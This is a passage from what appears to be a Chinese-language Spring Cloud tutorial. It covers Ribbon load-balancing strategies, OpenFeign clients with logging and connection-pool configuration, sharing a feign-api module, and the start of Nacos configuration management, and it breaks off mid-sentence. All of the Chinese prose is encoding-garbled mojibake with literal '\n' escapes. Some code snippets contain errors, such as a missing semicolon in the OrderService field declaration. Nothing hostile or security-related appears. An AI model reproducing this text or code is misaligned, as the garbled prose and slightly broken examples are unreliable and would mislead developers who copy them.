6.**RibbonLoadBalancerClient**ä¿®æ”¹è¯·æ±‚åœ°å€ï¼Œç”¨localhost:8081æ›¿ä»£userserviceï¼Œå¾—åˆ°`http://localhost:8081/user/1`ï¼Œå‘èµ·çœŸå®è¯·æ±‚\n\n## â‘¡è´Ÿè½½å‡è¡¡ç­–ç•¥\n\nè´Ÿè½½å‡è¡¡çš„è§„åˆ™éƒ½å®šä¹‰åœ¨IRuleæ¥å£ä¸­ï¼Œè€ŒIRuleæœ‰å¾ˆå¤šä¸åŒçš„å®ç°ç±»ï¼š\n\n![](https://img.jwt1399.top/img/202209211344655.png)\n\n**ä¸åŒè§„åˆ™çš„å«ä¹‰å¦‚ä¸‹ï¼š**\n\n| **å†…ç½®è´Ÿè½½å‡è¡¡è§„åˆ™ç±»**    | **è§„åˆ™æè¿°**                                                 |\n| ------------------------- | ------------------------------------------------------------ |\n| RoundRobinRule            | ç®€å•è½®è¯¢æœåŠ¡åˆ—è¡¨æ¥é€‰æ‹©æœåŠ¡å™¨ã€‚å®ƒæ˜¯Ribboné»˜è®¤çš„è´Ÿè½½å‡è¡¡è§„åˆ™ã€‚ |\n| AvailabilityFilteringRule | å¯¹ä»¥ä¸‹ä¸¤ç§æœåŠ¡å™¨è¿›è¡Œå¿½ç•¥ï¼š   ï¼ˆ1ï¼‰åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œè¿™å°æœåŠ¡å™¨å¦‚æœ3æ¬¡è¿æ¥å¤±è´¥ï¼Œè¿™å°æœåŠ¡å™¨å°±ä¼šè¢«è®¾ç½®ä¸ºâ€œçŸ­è·¯â€çŠ¶æ€ã€‚çŸ­è·¯çŠ¶æ€å°†æŒç»­30ç§’ï¼Œå¦‚æœå†æ¬¡è¿æ¥å¤±è´¥ï¼ŒçŸ­è·¯çš„æŒç»­æ—¶é—´å°±ä¼šå‡ ä½•çº§åœ°å¢åŠ ã€‚  ï¼ˆ2ï¼‰å¹¶å‘æ•°è¿‡é«˜çš„æœåŠ¡å™¨ã€‚å¦‚æœä¸€ä¸ªæœåŠ¡å™¨çš„å¹¶å‘è¿æ¥æ•°è¿‡é«˜ï¼Œé…ç½®äº†AvailabilityFilteringRuleè§„åˆ™çš„å®¢æˆ·ç«¯ä¹Ÿä¼šå°†å…¶å¿½ç•¥ã€‚å¹¶å‘è¿æ¥æ•°çš„ä¸Šé™ï¼Œå¯ä»¥ç”±å®¢æˆ·ç«¯çš„\\<clientName>.\\<clientConfigNameSpace>.ActiveConnectionsLimitå±æ€§è¿›è¡Œé…ç½®ã€‚ |\n| WeightedResponseTimeRule  | ä¸ºæ¯ä¸€ä¸ªæœåŠ¡å™¨èµ‹äºˆä¸€ä¸ªæƒé‡å€¼ã€‚æœåŠ¡å™¨å“åº”æ—¶é—´è¶Šé•¿ï¼Œè¿™ä¸ªæœåŠ¡å™¨çš„æƒé‡å°±è¶Šå°ã€‚è¿™ä¸ªè§„åˆ™ä¼šéšæœºé€‰æ‹©æœåŠ¡å™¨ï¼Œè¿™ä¸ªæƒé‡å€¼ä¼šå½±å“æœåŠ¡å™¨çš„é€‰æ‹©ã€‚ |\n| **ZoneAvoidanceRule**     | ä»¥åŒºåŸŸå¯ç”¨çš„æœåŠ¡å™¨ä¸ºåŸºç¡€è¿›è¡ŒæœåŠ¡å™¨çš„é€‰æ‹©ã€‚ä½¿ç”¨Zoneå¯¹æœåŠ¡å™¨è¿›è¡Œåˆ†ç±»ï¼Œè¿™ä¸ªZoneå¯ä»¥ç†è§£ä¸ºä¸€ä¸ªæœºæˆ¿ã€ä¸€ä¸ªæœºæ¶ç­‰ã€‚è€Œåå†å¯¹Zoneå†…çš„å¤šä¸ªæœåŠ¡åšè½®è¯¢ã€‚ |\n| BestAvailableRule         | å¿½ç•¥é‚£äº›çŸ­è·¯çš„æœåŠ¡å™¨ï¼Œå¹¶é€‰æ‹©å¹¶å‘æ•°è¾ƒä½çš„æœåŠ¡å™¨ã€‚             |\n| RandomRule                | éšæœºé€‰æ‹©ä¸€ä¸ªå¯ç”¨çš„æœåŠ¡å™¨ã€‚                                   |\n| RetryRule                 | é‡è¯•æœºåˆ¶çš„é€‰æ‹©é€»è¾‘                                           |\n\né»˜è®¤çš„å®ç°å°±æ˜¯ZoneAvoidanceRuleï¼Œæ˜¯ä¸€ç§è½®è¯¢æ–¹æ¡ˆ\n\n**è‡ªå®šä¹‰è´Ÿè½½å‡è¡¡ç­–ç•¥**\n\né€šè¿‡å®šä¹‰IRuleå®ç°å¯ä»¥ä¿®æ”¹è´Ÿè½½å‡è¡¡è§„åˆ™ï¼Œæœ‰ä¸¤ç§æ–¹å¼ï¼š\n\n- 1.å…¨å±€é…ç½®ï¼šåœ¨order-serviceä¸­çš„OrderApplicationç±»ä¸­ï¼Œå®šä¹‰ä¸€ä¸ªæ–°çš„IRule\n\n```java\n@Bean\npublic IRule randomRule(){\n    return new RandomRule();\n}\n```\n\n- 2.å•ä¸ªé…ç½®ï¼šåœ¨order-serviceçš„application.ymlæ–‡ä»¶ä¸­ï¼Œæ·»åŠ æ–°çš„é…ç½®ä¹Ÿå¯ä»¥ä¿®æ”¹è§„åˆ™ï¼š\n\n```yaml\nuserservice: # ç»™æŸä¸ªå¾®æœåŠ¡é…ç½®è´Ÿè½½å‡è¡¡è§„åˆ™ï¼Œè¿™é‡Œæ˜¯userserviceæœåŠ¡\n  ribbon:\n    NFLoadBalancerRuleClassName: com.netflix.loadbalancer.RandomRule # è´Ÿè½½å‡è¡¡è§„åˆ™ \n```\n\n> **æ³¨æ„**ï¼Œä¸€èˆ¬ç”¨é»˜è®¤çš„è´Ÿè½½å‡è¡¡è§„åˆ™ï¼Œä¸åšä¿®æ”¹ã€‚\n\n## â‘¢é¥¥é¥¿åŠ è½½\n\nRibboné»˜è®¤æ˜¯é‡‡ç”¨æ‡’åŠ è½½ï¼Œå³ç¬¬ä¸€æ¬¡è®¿é—®æ—¶æ‰ä¼šå»åˆ›å»ºLoadBalanceClientï¼Œè¯·æ±‚æ—¶é—´ä¼šå¾ˆé•¿ã€‚\n\nè€Œé¥¥é¥¿åŠ è½½åˆ™ä¼šåœ¨é¡¹ç›®å¯åŠ¨æ—¶åˆ›å»ºï¼Œé™ä½ç¬¬ä¸€æ¬¡è®¿é—®çš„è€—æ—¶ï¼Œé€šè¿‡ä¸‹é¢é…ç½®å¼€å¯é¥¥é¥¿åŠ è½½ï¼š\n\n```yaml\nribbon:\n  eager-load:\n    enabled: true\n    clients: userservice\n```\n\n# 5.æœåŠ¡è¿œç¨‹è°ƒç”¨â‘¡\n\n## â‘¡OpenFeign\n\n> å‰é¢åˆ©ç”¨RestTemplateå‘èµ·è¿œç¨‹è°ƒç”¨çš„ä»£ç \n>\n> ```java\n> String url = \"http://localhost:8081/user/\" + order.getUserId();\n> User user = restTemplate.getForObject(url, User.class);\n> ```\n>\n> å­˜åœ¨ä¸‹é¢çš„é—®é¢˜ï¼š\n>\n> - ä»£ç å¯è¯»æ€§å·®ï¼Œç¼–ç¨‹ä½“éªŒä¸ç»Ÿä¸€\n>\n> - å‚æ•°å¤æ‚URLéš¾ä»¥ç»´æŠ¤\n\nOpenFeignæ˜¯ä¸€ä¸ªå£°æ˜å¼çš„httpå®¢æˆ·ç«¯ï¼Œå…¶ä½œç”¨å°±æ˜¯å¸®åŠ©æˆ‘ä»¬ä¼˜é›…çš„å®ç°httpè¯·æ±‚çš„å‘é€ï¼Œè§£å†³ä¸Šé¢æåˆ°çš„é—®é¢˜ã€‚\n\n### â¶ä½¿ç”¨\n\n**æ­¥éª¤ä¸€ï¼šå¼•å…¥ä¾èµ–**\n\nåœ¨order-serviceæœåŠ¡çš„pomæ–‡ä»¶ä¸­å¼•å…¥openfeignçš„ä¾èµ–\n\n```xml\n<dependency>\n    <groupId>org.springframework.cloud</groupId>\n    <artifactId>spring-cloud-starter-openfeign</artifactId>\n</dependency>\n```\n\nä½¿ç”¨ openfeign ä¾èµ– ribbonï¼Œä½†æ˜¯æœ€æ–°ç‰ˆçš„ openfeign ç§»é™¤äº†ribbon ï¼Œå› æ­¤å¦‚æœå•ç‹¬ä½¿ç”¨openfeignéœ€è¦å¼•å…¥ribbonï¼Œå¹¶è¿›è¡Œé…ç½®ã€‚å¦‚æœé…åˆ eureka æˆ– nacos åˆ™ä¸ç”¨\n\n```xml\n<dependency>\n  <groupId>org.springframework.cloud</groupId>\n  <artifactId>spring-cloud-starter-netflix-ribbon</artifactId>\n</dependency>\n```\n\n```yaml\n# è¿™ä¸ªuserserviceæ˜¯åŠ äº†@FeignClientæ³¨è§£çš„ç±»çš„name\nuserservice:\n  ribbon:\n    # æœåŠ¡æä¾›è€…çš„åœ°å€ï¼Œä¸æ˜¯æœåŠ¡æ³¨å†Œä¸­å¿ƒçš„åœ°å€\n    listOfServers: http://localhost:8081\n```\n\n**æ­¥éª¤äºŒï¼šæ·»åŠ æ³¨è§£**\n\nåœ¨order-serviceçš„å¯åŠ¨ç±»æ·»åŠ æ³¨è§£å¼€å¯openfeignçš„åŠŸèƒ½ï¼š\n\n```java\n@EnableFeignClients //å¼€å¯feign\n@MapperScan(\"cn.xxxx.order.mapper\")\n@SpringBootApplication\npublic class OrderApplication {\n    public static void main(String[] args) {\n        SpringApplication.run(OrderApplication.class, args);\n    }\n}\n```\n\n**æ­¥éª¤ä¸‰ï¼šç¼–å†™Feignçš„å®¢æˆ·ç«¯**\n\nåœ¨order-serviceä¸­æ–°å»ºä¸€ä¸ªæ¥å£ï¼Œå†…å®¹å¦‚ä¸‹ï¼š\n\n```java\n@FeignClient(\"userservice\")\npublic interface UserClient {\n    @GetMapping(\"/user/{id}\")\n    User findById(@PathVariable(\"id\") Long id);\n}\n```\n\nè¿™ä¸ªå®¢æˆ·ç«¯ä¸»è¦æ˜¯åŸºäºSpringMVCçš„æ³¨è§£æ¥å£°æ˜è¿œç¨‹è°ƒç”¨çš„ä¿¡æ¯ï¼Œæ¯”å¦‚ï¼š\n\n- æœåŠ¡åç§°ï¼šuserservice\n- è¯·æ±‚æ–¹å¼ï¼šGET\n- è¯·æ±‚è·¯å¾„ï¼š/user/{id}\n- è¯·æ±‚å‚æ•°ï¼šLong id\n- è¿”å›å€¼ç±»å‹ï¼šUser\n\nè¿™æ ·ï¼ŒFeignå°±å¯ä»¥å¸®åŠ©æˆ‘ä»¬å‘é€httpè¯·æ±‚ï¼Œæ— éœ€è‡ªå·±ä½¿ç”¨RestTemplateæ¥å‘é€äº†ã€‚\n\n**æ­¥éª¤å››ï¼šå®ç°è¿œç¨‹è°ƒç”¨**\n\nä¿®æ”¹order-serviceä¸­çš„OrderServiceç±»ä¸­çš„queryOrderByIdæ–¹æ³•ï¼Œä½¿ç”¨Feignå®¢æˆ·ç«¯ä»£æ›¿RestTemplateï¼š\n\n```java\n@Service\npublic class OrderService {\n\n    @Autowired\n    private OrderMapper orderMapper;\n  \n    @Autowired\n    private UserClient userClient \n\n    public Order queryOrderById(Long orderId) {\n        // 1.æŸ¥è¯¢è®¢å•\n        Order order = orderMapper.findById(orderId);\n        // 2.åˆ©ç”¨Feignå‘èµ·httpè¯·æ±‚ï¼ŒæŸ¥è¯¢ç”¨æˆ·\n        User user = userClient.findById(order.getUserId());\n        // 3.å­˜å…¥order\n        order.setUser(user);\n        // 4.è¿”å›\n        return order;\n    }\n}\n```\n\n![å®ç°è¿‡ç¨‹](https://img.jwt1399.top/img/202209202105075.png)\n\n**æ€»ç»“**\n\nä½¿ç”¨Feignçš„æ­¥éª¤ï¼š\n\n- â‘  å¼•å…¥ä¾èµ–\n\n- â‘¡ æ·»åŠ @EnableFeignClientsæ³¨è§£\n\n- â‘¢ ç¼–å†™FeignClientæ¥å£\n\n- â‘£ ä½¿ç”¨FeignClientä¸­å®šä¹‰çš„æ–¹æ³•ä»£æ›¿RestTemplate\n\n### â·é…ç½®\n\nFeignå¯ä»¥æ”¯æŒå¾ˆå¤šçš„è‡ªå®šä¹‰é…ç½®ï¼Œå¦‚ä¸‹è¡¨æ‰€ç¤ºï¼š\n\n| ç±»å‹                   | ä½œç”¨             | è¯´æ˜                                                   |\n| ---------------------- | ---------------- | ------------------------------------------------------ |\n| **feign.Logger.Level** | ä¿®æ”¹æ—¥å¿—çº§åˆ«     | åŒ…å«å››ç§ä¸åŒçš„çº§åˆ«ï¼šNONEã€BASICã€HEADERSã€FULL         |\n| feign.codec.Decoder    | å“åº”ç»“æœçš„è§£æå™¨ | httpè¿œç¨‹è°ƒç”¨çš„ç»“æœåšè§£æï¼Œä¾‹å¦‚è§£æjsonå­—ç¬¦ä¸²ä¸ºjavaå¯¹è±¡ |\n| feign.codec.Encoder    | è¯·æ±‚å‚æ•°ç¼–ç      | å°†è¯·æ±‚å‚æ•°ç¼–ç ï¼Œä¾¿äºé€šè¿‡httpè¯·æ±‚å‘é€                   |\n| feign. Contract        | æ”¯æŒçš„æ³¨è§£æ ¼å¼   | é»˜è®¤æ˜¯SpringMVCçš„æ³¨è§£                                  |\n| feign. Retryer         | å¤±è´¥é‡è¯•æœºåˆ¶     | è¯·æ±‚å¤±è´¥çš„é‡è¯•æœºåˆ¶ï¼Œé»˜è®¤æ˜¯æ²¡æœ‰ï¼Œä¸è¿‡ä¼šä½¿ç”¨Ribbonçš„é‡è¯• |\n\næ—¥å¿—çš„çº§åˆ«åˆ†ä¸ºå››ç§ï¼š\n\n- NONEï¼šä¸è®°å½•ä»»ä½•æ—¥å¿—ä¿¡æ¯ï¼Œè¿™æ˜¯é»˜è®¤å€¼ã€‚\n- BASICï¼šä»…è®°å½•è¯·æ±‚çš„æ–¹æ³•ï¼ŒURLä»¥åŠå“åº”çŠ¶æ€ç å’Œæ‰§è¡Œæ—¶é—´ï¼ˆæ¨èä½¿ç”¨ï¼‰\n- HEADERSï¼šåœ¨BASICçš„åŸºç¡€ä¸Šï¼Œé¢å¤–è®°å½•äº†è¯·æ±‚å’Œå“åº”çš„å¤´ä¿¡æ¯\n- FULLï¼šè®°å½•æ‰€æœ‰è¯·æ±‚å’Œå“åº”çš„æ˜ç»†ï¼ŒåŒ…æ‹¬å¤´ä¿¡æ¯ã€è¯·æ±‚ä½“ã€å…ƒæ•°æ®ã€‚\n\nä¸€èˆ¬æƒ…å†µä¸‹ï¼Œé»˜è®¤å€¼å°±èƒ½æ»¡è¶³æˆ‘ä»¬ä½¿ç”¨ï¼Œå¦‚æœè¦è‡ªå®šä¹‰æ—¶ï¼Œå¯ä»¥é€šè¿‡**ä¿®æ”¹é…ç½®æ–‡ä»¶**æˆ–è€…åˆ›å»º**è‡ªå®šä¹‰@Beanè¦†ç›–é»˜è®¤Bean**\n\n**ä¿®æ”¹é…ç½®æ–‡ä»¶æ–¹å¼**\n\n- é’ˆå¯¹å•ä¸ªæœåŠ¡ï¼š\n\n```yaml\nfeign:  \n  client:\n    config: \n      userservice: # é’ˆå¯¹æŸä¸ªå¾®æœåŠ¡çš„é…ç½®\n        loggerLevel: FULL #  æ—¥å¿—çº§åˆ« \n```\n\n- é’ˆå¯¹æ‰€æœ‰æœåŠ¡ï¼š\n\n```yaml\nfeign:  \n  client:\n    config: \n      default: # è¿™é‡Œç”¨defaultå°±æ˜¯å…¨å±€é…ç½®ï¼Œå¦‚æœæ˜¯å†™æœåŠ¡åç§°ï¼Œåˆ™æ˜¯é’ˆå¯¹æŸä¸ªå¾®æœåŠ¡çš„é…ç½®\n        loggerLevel: FULL #  æ—¥å¿—çº§åˆ« \n```\n\n**è‡ªå®šä¹‰Beanè¦†ç›–**\n\nä¹Ÿå¯ä»¥åŸºäºJavaä»£ç æ¥ä¿®æ”¹æ—¥å¿—çº§åˆ«ï¼Œå…ˆå£°æ˜ä¸€ä¸ªç±»ï¼Œç„¶åå£°æ˜ä¸€ä¸ªLogger.Levelçš„å¯¹è±¡ï¼š\n\n```java\npublic class DefaultFeignConfiguration  {\n    @Bean\n    public Logger.Level feignLogLevel(){\n        return Logger.Level.BASIC; // æ—¥å¿—çº§åˆ«ä¸ºBASIC\n    }\n}\n```\n\nå¦‚æœè¦**å…¨å±€ç”Ÿæ•ˆ**ï¼Œå°†å…¶æ”¾åˆ°å¯åŠ¨ç±»çš„@EnableFeignClientsè¿™ä¸ªæ³¨è§£ä¸­ï¼š\n\n```java\n@EnableFeignClients(defaultConfiguration = DefaultFeignConfiguration.class) \n```\n\nå¦‚æœæ˜¯**å±€éƒ¨ç”Ÿæ•ˆ**ï¼Œåˆ™æŠŠå®ƒæ”¾åˆ°å¯¹åº”çš„@FeignClientè¿™ä¸ªæ³¨è§£ä¸­ï¼š\n\n```java\n@FeignClient(value = \"userservice\", configuration = DefaultFeignConfiguration.class) \n```\n\n### â¸ä¼˜åŒ–\n\nFeignåº•å±‚å‘èµ·httpè¯·æ±‚ï¼Œä¾èµ–äºå…¶å®ƒçš„æ¡†æ¶ã€‚å…¶åº•å±‚å®¢æˆ·ç«¯å®ç°åŒ…æ‹¬ï¼š\n\n- URLConnectionï¼šé»˜è®¤å®ç°ï¼Œä¸æ”¯æŒè¿æ¥æ± \n\n- Apache HttpClient ï¼šæ”¯æŒè¿æ¥æ± \n\n- OKHttpï¼šæ”¯æŒè¿æ¥æ± \n\nå› æ­¤æé«˜Feignçš„æ€§èƒ½ä¸»è¦æ‰‹æ®µå°±æ˜¯ä½¿ç”¨**è¿æ¥æ± **ä»£æ›¿é»˜è®¤çš„URLConnectionã€‚è¿™é‡Œæˆ‘ä»¬ç”¨Apacheçš„HttpClientæ¥æ¼”ç¤ºã€‚\n\n**æ­¥éª¤ä¸€ï¼š**å¼•å…¥ä¾èµ–\n\nåœ¨order-serviceçš„pomæ–‡ä»¶ä¸­å¼•å…¥Apacheçš„HttpClientä¾èµ–ï¼š\n\n```xml\n<!--httpClientçš„ä¾èµ– -->\n<dependency>\n    <groupId>io.github.openfeign</groupId>\n    <artifactId>feign-httpclient</artifactId>\n</dependency>\n```\n\n**æ­¥éª¤äºŒï¼š**é…ç½®è¿æ¥æ± \n\nåœ¨order-serviceçš„application.ymlä¸­æ·»åŠ é…ç½®ï¼š\n\n```yaml\nfeign:\n  client:\n    config:\n      default: # defaultå…¨å±€çš„é…ç½®\n        loggerLevel: BASIC # æ—¥å¿—çº§åˆ«ï¼ŒBASICå°±æ˜¯åŸºæœ¬çš„è¯·æ±‚å’Œå“åº”ä¿¡æ¯\n  httpclient:\n    enabled: true # å¼€å¯feignå¯¹HttpClientçš„æ”¯æŒ\n    max-connections: 200 # æœ€å¤§çš„è¿æ¥æ•°\n    max-connections-per-route: 50 # æ¯ä¸ªè·¯å¾„çš„æœ€å¤§è¿æ¥æ•°\n```\n\n### â¹æœ€ä½³å®è·µ\n\næ‰€è°“æœ€è¿‘å®è·µï¼Œå°±æ˜¯ä½¿ç”¨è¿‡ç¨‹ä¸­æ€»ç»“çš„ç»éªŒï¼Œæœ€å¥½çš„ä¸€ç§ä½¿ç”¨æ–¹å¼ã€‚ä»”ç»†å¯ä»¥å‘ç°ï¼ŒFeignçš„å®¢æˆ·ç«¯ä¸æœåŠ¡æä¾›è€…çš„controllerä»£ç éå¸¸ç›¸ä¼¼ï¼š\n\n| UserClient                                           | UserController                                               |\n| ---------------------------------------------------- | ------------------------------------------------------------ |\n| ![](https://img.jwt1399.top/img/202209241117530.png) | <img src=\"https://img.jwt1399.top/img/202209241117602.png\" style=\"zoom: 67%;\" /> |\n\næœ‰æ²¡æœ‰ä¸€ç§åŠæ³•ç®€åŒ–è¿™ç§é‡å¤çš„ä»£ç ç¼–å†™å‘¢ï¼Ÿ\n\n**æ–¹æ¡ˆä¸€ï¼šç»§æ‰¿æ–¹å¼**\n\nä¸€æ ·çš„ä»£ç å¯ä»¥é€šè¿‡ç»§æ‰¿æ¥å…±äº«ï¼š\n\n- 1.å®šä¹‰ä¸€ä¸ªAPIæ¥å£ï¼Œåˆ©ç”¨å®šä¹‰æ–¹æ³•ï¼Œå¹¶åŸºäºSpringMVCæ³¨è§£åšå£°æ˜ã€‚\n- 2.Feignå®¢æˆ·ç«¯å’ŒControlleréƒ½é›†æˆè¯¥æ¥å£\n\n![](https://img.jwt1399.top/img/202209241120933.png)ä¼˜ç‚¹ï¼š\n\n- ç®€å•\n- å®ç°äº†ä»£ç å…±äº«\n\nç¼ºç‚¹ï¼š\n\n- æœåŠ¡æä¾›æ–¹ã€æœåŠ¡æ¶ˆè´¹æ–¹ç´§è€¦åˆ\n\n- å‚æ•°åˆ—è¡¨ä¸­çš„æ³¨è§£æ˜ å°„å¹¶ä¸ä¼šç»§æ‰¿ï¼Œå› æ­¤Controllerä¸­å¿…é¡»å†æ¬¡å£°æ˜æ–¹æ³•ã€å‚æ•°åˆ—è¡¨ã€æ³¨è§£\n\n**æ–¹æ¡ˆäºŒï¼šæŠ½å–æ–¹å¼**\n\nå°†Feignçš„ClientæŠ½å–ä¸ºç‹¬ç«‹æ¨¡å—ï¼Œå¹¶ä¸”æŠŠæ¥å£æœ‰å…³çš„POJOã€é»˜è®¤çš„Feigné…ç½®éƒ½æ”¾åˆ°è¿™ä¸ªæ¨¡å—ä¸­ï¼Œæä¾›ç»™æ‰€æœ‰æ¶ˆè´¹è€…ä½¿ç”¨ã€‚\n\nä¾‹å¦‚ï¼Œå°†UserClientã€Userã€Feignçš„é»˜è®¤é…ç½®éƒ½æŠ½å–åˆ°ä¸€ä¸ªfeign-apiåŒ…ä¸­ï¼Œæ‰€æœ‰å¾®æœåŠ¡å¼•ç”¨è¯¥ä¾èµ–åŒ…ï¼Œå³å¯ç›´æ¥ä½¿ç”¨ã€‚\n\n![](https://img.jwt1399.top/img/202209241123914.png)\n\n**æ­¥éª¤ä¸€ï¼šæŠ½å–**\n\né¦–å…ˆåˆ›å»ºä¸€ä¸ªmoduleï¼Œå‘½åä¸ºfeign-apiï¼Œåœ¨feign-apiä¸­ç„¶åå¼•å…¥feignçš„starterä¾èµ–\n\n```xml\n<dependency>\n    <groupId>org.springframework.cloud</groupId>\n    <artifactId>spring-cloud-starter-openfeign</artifactId>\n</dependency>\n```\n\nç„¶åï¼Œorder-serviceä¸­ç¼–å†™çš„UserClientã€Userã€DefaultFeignConfigurationéƒ½å¤åˆ¶åˆ°feign-apié¡¹ç›®ä¸­\n\n![](https://img.jwt1399.top/img/202209241125595.png)\n\n\n\n**æ­¥éª¤äºŒï¼šåœ¨order-serviceä¸­ä½¿ç”¨feign-api**\n\né¦–å…ˆï¼Œåˆ é™¤order-serviceä¸­çš„UserClientã€Userã€DefaultFeignConfigurationç­‰ç±»æˆ–æ¥å£ã€‚åœ¨order-serviceçš„pomæ–‡ä»¶ä¸­ä¸­å¼•å…¥feign-apiçš„ä¾èµ–ï¼š\n\n```xml\n<dependency>\n    <groupId>cn.itcast.demo</groupId>\n    <artifactId>feign-api</artifactId>\n    <version>1.0</version>\n</dependency>\n```\n\nä¿®æ”¹order-serviceä¸­çš„æ‰€æœ‰ä¸ä¸Šè¿°ä¸‰ä¸ªç»„ä»¶æœ‰å…³çš„å¯¼åŒ…éƒ¨åˆ†ï¼Œæ”¹æˆå¯¼å…¥feign-apiä¸­çš„åŒ…\n\n**æ­¥éª¤ä¸‰ï¼šé‡å¯æµ‹è¯•**\n\né‡å¯åï¼Œå‘ç°æœåŠ¡æŠ¥é”™äº†ï¼š\n\n![](../images/SpringCloud-å®ç”¨ç¯‡/image-20210714205623048.png)\n\nè¿™æ˜¯å› ä¸ºUserClientç°åœ¨åœ¨cn.itcast.feign.clientsåŒ…ä¸‹ï¼Œè€Œorder-serviceçš„@EnableFeignClientsæ³¨è§£æ˜¯åœ¨cn.itcast.orderåŒ…ä¸‹ï¼Œä¸åœ¨åŒä¸€ä¸ªåŒ…ï¼Œæ— æ³•æ‰«æåˆ°UserClientã€‚\n\n**æ­¥éª¤å››ï¼šè§£å†³æ‰«æåŒ…é—®é¢˜**\n\næ–¹å¼ä¸€ï¼šæŒ‡å®šFeignåº”è¯¥æ‰«æçš„åŒ…ï¼š\n\n```java\n@EnableFeignClients(basePackages = \"cn.itcast.feign.clients\")\n```\n\næ–¹å¼äºŒï¼šæŒ‡å®šéœ€è¦åŠ è½½çš„Clientæ¥å£ï¼š\n\n```java\n@EnableFeignClients(clients = {UserClient.class})\n```\n\n# 6.ç»Ÿä¸€é…ç½®ç®¡ç†\n\n## â‘ Nacos\n\nNacosé™¤äº†å¯ä»¥åšæ³¨å†Œä¸­å¿ƒï¼ŒåŒæ ·å¯ä»¥åšé…ç½®ç®¡ç†æ¥ä½¿ç”¨ã€‚å½“å¾®æœåŠ¡éƒ¨ç½²çš„å®ä¾‹è¶Šæ¥è¶Šå¤šï¼Œè¾¾åˆ°æ•°åã€æ•°ç™¾æ—¶ï¼Œé€ä¸ªä¿®æ”¹å¾®æœåŠ¡é…ç½®å°±ä¼šè®©äººæŠ“ç‹‚ï¼Œè€Œä¸”å¾ˆå®¹æ˜“å‡ºé”™ã€‚æˆ‘ä»¬éœ€è¦ä¸€ç§ç»Ÿä¸€é…ç½®ç®¡ç†æ–¹æ¡ˆï¼Œå¯ä»¥é›†ä¸­ç®¡ç†æ‰€æœ‰å®ä¾‹çš„é…ç½®ã€‚\n\n![](https://img.jwt1399.top/img/202209241704284.png)\n\n\n\nNacosä¸€æ–¹é¢å¯ä»¥å°†é…ç½®é›†ä¸­ç®¡ç†ï¼Œå¦ä¸€æ–¹å¯ä»¥åœ¨é…ç½®å˜æ›´æ—¶ï¼ŒåŠæ—¶é€šçŸ¥å¾®æœåŠ¡ï¼Œå®ç°é…ç½®çš„çƒ­æ›´æ–°ã€‚\n\n### â¶ç»Ÿä¸€é…ç½®ç®¡ç†\n\n**æ­¥éª¤ä¸€ï¼šåœ¨nacosä¸­æ·»åŠ é…ç½®æ–‡ä»¶**\n\n| 1.åœ¨Nacosä¸­æ·»åŠ é…ç½®ä¿¡æ¯                              | 2.åœ¨å¼¹å‡ºè¡¨å•ä¸­å¡«å†™é…ç½®ä¿¡æ¯                           |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n| ![](https://img.jwt1399.top/img/202209241700314.png) | ![](https://img.jwt1399.top/img/202209241700595.png) |\n\n**æ­¥éª¤äºŒï¼šä»å¾®æœåŠ¡æ‹‰å–é…ç½®**\n\nå¾®æœåŠ¡è¦æ‹‰å–nacosä¸­ç®¡ç†çš„é…ç½®ï¼Œå¹¶ä¸”ä¸æœ¬åœ°çš„application.ymlé…ç½®åˆå¹¶ï¼Œæ‰èƒ½å®Œæˆé¡¹ç›®å¯åŠ¨ã€‚\n\nä½†å¦‚æœå°šæœªè¯»å–application.ymlï¼Œåˆå¦‚ä½•å¾—çŸ¥nacosåœ°å€å‘¢ï¼Ÿ\n\nå› æ­¤springå¼•å…¥äº†ä¸€ç§æ–°çš„é…ç½®æ–‡ä»¶ï¼š`bootstrap.yaml`æ–‡ä»¶ï¼Œä¼šåœ¨application.ymlä¹‹å‰è¢«è¯»å–ï¼Œæµç¨‹å¦‚ä¸‹ï¼š\n\n| ä¼ ç»Ÿè¯»å–é…ç½®      | ![](https://img.jwt1399.top/img/202209241707016.png) |\n| ----------------- | ---------------------------------------------------- |\n| **nacosç®¡ç†é…ç½®** | ![](https://img.jwt1399.top/img/202209241707835.png) |\n\n1.å¼•å…¥Nacosçš„é…ç½®ç®¡ç†å®¢æˆ·ç«¯ä¾èµ–\n\n```xml\n<!--nacosé…ç½®ç®¡ç†ä¾èµ–-->\n<dependency>\n    <groupId>com.alibaba.cloud</groupId>\n    <artifactId>spring-cloud-starter-alibaba-nacos-config</artifactId>\n</dependency>\n```\n\n2.åœ¨userserviceçš„resourceç›®å½•æ·»åŠ ä¸€ä¸ªbootstrap.ymlæ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶æ˜¯å¼•å¯¼æ–‡ä»¶ï¼Œä¼˜å…ˆçº§é«˜äºapplication.ymlï¼š\n\n```yaml\nspring:\n  application:\n    name: userservice # æœåŠ¡åç§°\n  profiles:\n    active: dev #å¼€å‘ç¯å¢ƒï¼Œè¿™é‡Œæ˜¯dev \n  cloud:\n    nacos:\n      server-addr: localhost:8848 # Nacosåœ°å€\n      config:\n        file-extension: yaml # æ–‡ä»¶åç¼€å\n```\n\nè¿™é‡Œä¼šæ ¹æ®spring.cloud.nacos.server-addrè·å–nacosåœ°å€ï¼Œå†æ ¹æ®\n\n`${spring.application.name}-${spring.profiles.active}.${spring.cloud.nacos.config.file-extension}`ä½œä¸ºæ–‡ä»¶idï¼Œæ¥è¯»å–é…ç½®ã€‚æœ¬ä¾‹ä¸­ï¼Œå°±æ˜¯å»è¯»å–`userservice-dev.yaml`\n\n![](https://img.jwt1399.top/img/202209241709238.png)\n\n3.åœ¨user-serviceä¸­çš„UserControllerä¸­æ·»åŠ ä¸šåŠ¡é€»è¾‘ï¼Œè¯»å–pattern.dateformaté…ç½®\n\n```java\n@Slf4j\n@RestController\n@RequestMapping(\"/user\")\npublic class UserController {\n\n    @Value(\"${pattern.dateformat}\")\n    private String dateformat;\n\n    @GetMapping(\"now\")\n    public String now(){\n        return LocalDateTime.now().format(DateTimeFormatter.ofPattern(dateformat));\n    }\n}\n```\n\nè®¿é—®é¡µé¢`http://127.0.0.1:8081/user/now`å³å¯çœ‹åˆ°æ—¶é—´\n\n**æ€»ç»“ï¼š**å°†é…ç½®äº¤ç»™Nacosç®¡ç†çš„æ­¥éª¤\n\n- â‘ åœ¨Nacosä¸­æ·»åŠ é…ç½®æ–‡ä»¶\n\n- â‘¡åœ¨å¾®æœåŠ¡ä¸­å¼•å…¥nacosçš„configä¾èµ–\n\n- â‘¢åœ¨å¾®æœåŠ¡ä¸­æ·»åŠ 